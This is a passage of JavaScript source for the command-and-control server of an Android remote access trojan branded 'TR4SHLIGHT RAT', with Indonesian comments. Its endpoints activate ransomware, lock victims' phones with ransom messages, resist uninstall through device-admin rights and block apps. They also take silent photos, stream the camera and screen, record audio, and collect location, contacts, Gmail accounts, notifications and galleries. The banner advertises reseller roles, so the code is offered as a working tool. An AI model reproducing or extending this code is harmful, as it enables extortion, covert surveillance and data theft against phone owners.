  queueCommand(device, 'hard_lock', `${message || 'YOUR PHONE IS LOCKED!!!!'}|${pin || '1234'}`);
  res.json({ status: 'queued' });
});

app.get('/api/activate_ransomware', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  const pin = req.query.pin || '1234';
  queueCommand(req.query.device, 'activate_ransomware', `|${pin}`);
  res.json({ status: 'queued' });
});

app.get('/api/unlock', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'unlock');
  res.json({ status: 'queued' });
});

app.get('/api/decrypt_files', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'decrypt_files');
  res.json({ status: 'queued' });
});
// ==================== FITUR BARU: LOCK CUSTOM (HTML - TANPA PIN) ====================
app.get('/api/lock_custom', (req, res) => {
  const { device, html, audio } = req.query;
  if (!device) return res.status(400).json({ error: 'Device ID required' });
  if (!html) return res.status(400).json({ error: 'HTML content required' });
  // Format: html|||audioUrl (Tanpa PIN)
  const extra = `${html}|||${audio || ''}`;
  queueCommand(device, 'lock_custom', extra);
  res.json({ status: 'queued' });
});

// ==================== FITUR BARU: VIDEO LOCK (100% VIDEO - TANPA PIN) ====================
app.get('/api/lock_video', (req, res) => {
  const { device, url } = req.query;
  if (!device) return res.status(400).json({ error: 'Device ID required' });
  if (!url) return res.status(400).json({ error: 'Video URL required' });
  // Format: videoUrl (Tanpa PIN)
  const extra = `${url}`;
  queueCommand(device, 'lock_video', extra);
  res.json({ status: 'queued' });
});

// ==================== FITUR BARU: UNLOCK CUSTOM & VIDEO (LANGSUNG BUKA TANPA PIN) ====================
app.get('/api/unlock_custom', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'unlock_custom');
  res.json({ status: 'queued' });
});

app.get('/api/unlock_video', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'unlock_video');
  res.json({ status: 'queued' });
});

// ==================== FITUR BARU: ANTI UNINSTALL (DEVICE ADMIN) ====================
// ==================== FITUR BARU: ANTI UNINSTALL (DEVICE ADMIN) ====================
app.get('/api/request_admin', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'request_admin');
  res.json({ status: 'queued' });
});

app.get('/api/check_admin', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'check_admin');
  res.json({ status: 'queued' });
});

// ==================== FITUR BARU: BLOCK APPS ====================
app.get('/api/block_app', (req, res) => {
  const { device, package } = req.query;
  if (!device) return res.status(400).json({ error: 'Device ID required' });
  if (!package) return res.status(400).json({ error: 'Package name required (e.g., com.dana)' });
  queueCommand(device, 'block_app', package);
  res.json({ status: 'queued' });
});

app.get('/api/unblock_app', (req, res) => {
  const { device, package } = req.query;
  if (!device) return res.status(400).json({ error: 'Device ID required' });
  if (!package) return res.status(400).json({ error: 'Package name required' });
  queueCommand(device, 'unblock_app', package);
  res.json({ status: 'queued' });
});

app.get('/api/get_installed_apps', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'get_installed_apps');
  res.json({ status: 'queued' });
});

// Surveillance
app.get('/api/take_photo', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'take_photo', req.query.side || 'back');
  res.json({ status: 'queued' });
});

app.get('/api/get_location', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'get_location');
  res.json({ status: 'queued' });
});

app.get('/api/get_contacts', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'get_contacts');
  res.json({ status: 'queued' });
});

app.get('/api/get_gmails', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'get_gmails');
  res.json({ status: 'queued' });
});

app.get('/api/set_wallpaper', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'set_wallpaper', req.query.url || '');
  res.json({ status: 'queued' });
});

// Media Control
app.get('/api/play_audio', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'play_audio', req.query.url || '');
  res.json({ status: 'queued' });
});

app.get('/api/stop_audio', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'stop_audio');
  res.json({ status: 'queued' });
});

// Hardware Control
app.get('/api/flashlight_on', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'flashlight_on');
  res.json({ status: 'queued' });
});

app.get('/api/flashlight_off', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'flashlight_off');
  res.json({ status: 'queued' });
});

app.get('/api/flash_strobe', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'flash_strobe');
  res.json({ status: 'queued' });
});

app.get('/api/stop_strobe', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'stop_strobe');
  res.json({ status: 'queued' });
});

app.get('/api/vibrate_loop', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'vibrate_loop');
  res.json({ status: 'queued' });
});

// System Control
app.get('/api/open_url', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'open_url', req.query.url || '');
  res.json({ status: 'queued' });
});

app.get('/api/force_open', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'force_open');
  res.json({ status: 'queued' });
});

app.get('/api/show_notification', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'show_notification', `${req.query.title || ''}|${req.query.message || ''}`);
  res.json({ status: 'queued' });
});

// ==================== LIVE STREAMING (FIXED 100%) ====================
// Live Camera & Screen Fix
app.get('/api/live_camera_start', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'live_camera_start', req.query.side || 'back');
  res.json({ status: 'queued' });
});

app.get('/api/live_screen_start', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'live_screen_start');
  res.json({ status: 'queued' });
});

app.get('/api/live_stop', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'live_stop');
  res.json({ status: 'queued' });
});

// Legacy Stream Shortcuts
app.get('/api/start_cam_stream', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'start_cam_stream', req.query.side || 'back');
  res.json({ status: 'queued' });
});

app.get('/api/stop_cam_stream', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'stop_cam_stream');
  res.json({ status: 'queued' });
});

app.get('/api/start_screen_stream', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'start_screen_stream');
  res.json({ status: 'queued' });
});

app.get('/api/stop_screen_stream', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'stop_screen_stream');
  res.json({ status: 'queued' });
});

app.get('/api/record_audio', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'record_audio');
  res.json({ status: 'queued' });
});

app.get('/api/stop_record_audio', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'stop_record_audio');
  res.json({ status: 'queued' });
});

// Grabbers
app.get('/api/grab_gallery', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'grab_gallery');
  res.json({ status: 'queued' });
});

app.get('/api/grab_videos', (req, res) => {
  if (!req.query.device) return res.status(400).json({ error: 'Device ID required' });
  queueCommand(req.query.device, 'grab_videos');
  res.json({ status: 'queued' });
});
// ==================== DATA RECEIVING ENDPOINTS ====================
app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat(RAT_NOTIFS);
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat(RAT_NOTIFS, n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  res.json(readRat(RAT_NOTIFS).filter(x => x.targetId === req.params.id));
});

app.post('/api/gallery/upload/:deviceId', (req, res) => {
  const { filename, data, type } = req.body;
  let g = readRat(RAT_GALLERY);
  g.unshift({ device_id: req.params.deviceId, filename, data, type, timestamp: new Date().toISOString() });
  if (g.length > 1000) g = g.slice(0, 1000);
  saveRat(RAT_GALLERY, g);
  res.json({ success: true });
});

app.get('/api/gallery/:deviceId', (req, res) => {
  res.json(readRat(RAT_GALLERY).filter(g => g.device_id === req.params.deviceId));
});

app.post('/api/audio/upload/:deviceId', (req, res) => {
  const { filename, data, duration } = req.body;
  let a = readRat(RAT_AUDIO);
  a.unshift({ device_id: req.params.deviceId, filename, data, duration, timestamp: new Date().toISOString() });
  if (a.length > 500) a = a.slice(0, 500);
  saveRat(RAT_AUDIO, a);
  res.json({ success: true });
});

app.get('/api/audio/:deviceId', (req, res) => {
  res.json(readRat(RAT_AUDIO).filter(a => a.device_id === req.params.deviceId));
});

app.post('/api/spyware/location/update', (req, res) => {
  let loc = readRat(RAT_LOCATIONS);
  loc.unshift({ ...req.body, timestamp: new Date() });
  if (loc.length > 500) loc = loc.slice(0, 500);
  saveRat(RAT_LOCATIONS, loc);
  res.json({ success: true });
});

app.get('/api/spyware/location/get', (req, res) => {
  const limit = parseInt(req.query.limit) || 50;
  res.json({ success: true, locations: readRat(RAT_LOCATIONS).filter(l => l.device_id === req.query.device).slice(0, limit) });
});

app.post('/api/update-battery/:deviceId', (req, res) => {
  const { battery, charging } = req.body;
  let bats = readRat(RAT_BATTERY);
  const idx = bats.findIndex(b => b.device_id === req.params.deviceId);
  const newB = { device_id: req.params.deviceId, battery, charging, timestamp: new Date() };
  if (idx !== -1) bats[idx] = newB; else bats.push(newB);
  saveRat(RAT_BATTERY, bats);
  
  let targets = readRat(RAT_TARGETS);
  const tIdx = targets.findIndex(t => t.id === req.params.deviceId);
  if (tIdx !== -1) { targets[tIdx].battery = battery; saveRat(RAT_TARGETS, targets); }
  res.json({ success: true });
});

app.get('/api/battery/:deviceId', (req, res) => {
  res.json(readRat(RAT_BATTERY).find(b => b.device_id === req.params.deviceId) || { battery: 0, charging: false });
});

// ==================== LOCK LIVE CHAT ====================
app.post('/api/lock-chat/:id', (req, res) => {
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[req.params.id]) lockChats[req.params.id] = [];
  lockChats[req.params.id].push({ from: from || 'owner', text, time: new Date().toISOString().substring(11,16) });
  if (lockChats[req.params.id].length > 200) lockChats[req.params.id] = lockChats[req.params.id].slice(-200);
  res.json({ status: 'sent' });
});

app.get('/api/lock-chat/:id', (req, res) => res.json({ messages: lockChats[req.params.id] || [] }));
app.get('/api/lock-chat-all/:id', (req, res) => res.json({ messages: lockChats[req.params.id] || [] }));
app.delete('/api/lock-chat/:id', (req, res) => { lockChats[req.params.id] = []; res.json({ status: 'cleared' }); });

// ==================== DASHBOARD STATS ====================
app.get('/api/dashboard/stats', (req, res) => {
  const targets = readRat(RAT_TARGETS);
  res.json({
    total_targets: targets.length,
    online: targets.filter(t => t.status === 'Online').length,
    offline: targets.filter(t => t.status !== 'Online').length,
    total_gallery: readRat(RAT_GALLERY).length,
    last_update: new Date().toISOString()
  });
});

// ==================== START SERVER ====================
app.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔═══════════════════════════════════════════════════════════════╗
║               🌐 TR4SHLIGHT RAT BACKEND v1.0                       ║
║               Port: ${PORT}                                         ║
╠═══════════════════════════════════════════════════════════════╣
║  ✅ Pairing System Integrated                                    ║
║  ✅ Multi-Role Access (Owner, Dev, Member, Reseller)            ║
║  ✅ Cleaned Commands (Removed non-working features)            ║
╠═══════════════════════════════════════════════════════════════╣
║  GET  /api/list-targets       List devices                    ║
║  GET  /api/hard_lock          Lock device                    ║
║  GET  /api/activate_ransomware Ransomware                     ║
║  GET  /api/unlock              Unlock device                  ║
║  GET  /api/take_photo          Silent camera                  ║
║  GET  /api/grab_gallery        Grab all images               ║
║  POST /api/pair-target         Pairing logic                  ║
╚═══════════════════════════════════════════════════════════════╝
  `);
});


async function backupDatabase() {
    try {
        if (!fs.existsSync(DB_PATH)) {
            console.log('[BACKUP] database.json tidak ditemukan!');
            return;
        }

        const waktu = new Date().toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta'
        });

        await bot.sendDocument(
            OWNER_ID,
            DB_PATH,
            {
                caption: `📦 <b>AUTO BACKUP DATABASE</b>

🗓 <b>Waktu:</b> ${waktu}
📁 <b>File:</b> database.json
✅ <b>Status:</b> Berhasil`,
                parse_mode: 'HTML'
            }
        );

        console.log(`[BACKUP] Berhasil dikirim ke Owner (${waktu})`);
    } catch (err) {
        console.error('[BACKUP] Gagal:', err);
    }
}

// Backup saat bot dijalankan
backupDatabase();

// Backup otomatis setiap 1 jam
setInterval(backupDatabase, 60 * 60 * 1000);

console.log('TR4SHLIGHT 𝐎𝐍𝐋𝐈𝐍𝐄');
console.log('TR4SHLIGHT 𝐒𝐈𝐀𝐏 𝐁𝐀𝐍𝐓𝐀𝐘 𝐌𝐀𝐊𝐋𝐔');
console.log('TR4SHLIGHT 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘 𝐅𝐀𝐍𝐓𝐙𝐘𝐘');;